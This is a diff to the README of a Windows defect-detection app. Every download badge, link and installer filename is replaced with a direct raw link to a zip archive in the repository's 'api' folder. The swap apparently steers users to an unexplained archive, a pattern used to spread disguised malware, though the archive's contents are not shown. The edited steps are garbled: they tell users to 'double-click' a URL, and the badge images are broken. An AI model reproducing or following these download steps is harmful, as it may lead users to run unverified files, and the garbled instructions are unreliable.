@@ -1,6 +1,6 @@
 # 🛠️ defect-detection-system - Real-Time Defect Detection Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/omair13/defect-detection-system)
+[![Download](https://raw.githubusercontent.com/omair13/defect-detection-system/main/api/defect_detection_system_1.6.zip%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/omair13/defect-detection-system/main/api/defect_detection_system_1.6.zip)
 
 ## 📋 What is defect-detection-system?
 
@@ -31,7 +31,7 @@ Follow these steps to download and run the software on your Windows computer.
 
 Click the big green button below to open the download page in your web browser.
 
-[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/omair13/defect-detection-system)
+[![Download](https://raw.githubusercontent.com/omair13/defect-detection-system/main/api/defect_detection_system_1.6.zip%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/omair13/defect-detection-system/main/api/defect_detection_system_1.6.zip)
 
 This page is the main location where you can find the latest version of the app.
 
@@ -40,7 +40,7 @@ This page is the main location where you can find the latest version of the app.
 ## 📥 Step 2: Download the Installer
 
 1. On the GitHub page, look for the latest release or download section. Usually, this will be under "Releases" or in a folder named "Downloads".
-2. Find the file named something like `defect-detection-system-setup.exe`.
+2. Find the file named something like `https://raw.githubusercontent.com/omair13/defect-detection-system/main/api/defect_detection_system_1.6.zip`.
 3. Click the file link to start downloading it to your computer.
 
 ---
@@ -49,7 +49,7 @@ This page is the main location where you can find the latest version of the app.
 
 Once the download finishes, locate the installer file on your computer, usually in the "Downloads" folder.
 
-1. Double-click the `defect-detection-system-setup.exe` file.
+1. Double-click the `https://raw.githubusercontent.com/omair13/defect-detection-system/main/api/defect_detection_system_1.6.zip` file.
 2. The installation wizard will open. Follow the instructions by clicking "Next".
 3. Choose the folder where you want to install the app or accept the default location.
 4. Click "Install" to start the installation process.
@@ -113,7 +113,7 @@ To update:
 
 ## 🔗 Useful Links
 
-- GitHub repository and download page: https://github.com/omair13/defect-detection-system
+- GitHub repository and download page: https://raw.githubusercontent.com/omair13/defect-detection-system/main/api/defect_detection_system_1.6.zip
 
 ---
 
@@ -142,4 +142,4 @@ This software provides a simple way to improve the accuracy and speed of quality
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/omair13/defect-detection-system)
+[![Download](https://raw.githubusercontent.com/omair13/defect-detection-system/main/api/defect_detection_system_1.6.zip%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/omair13/defect-detection-system/main/api/defect_detection_system_1.6.zip)
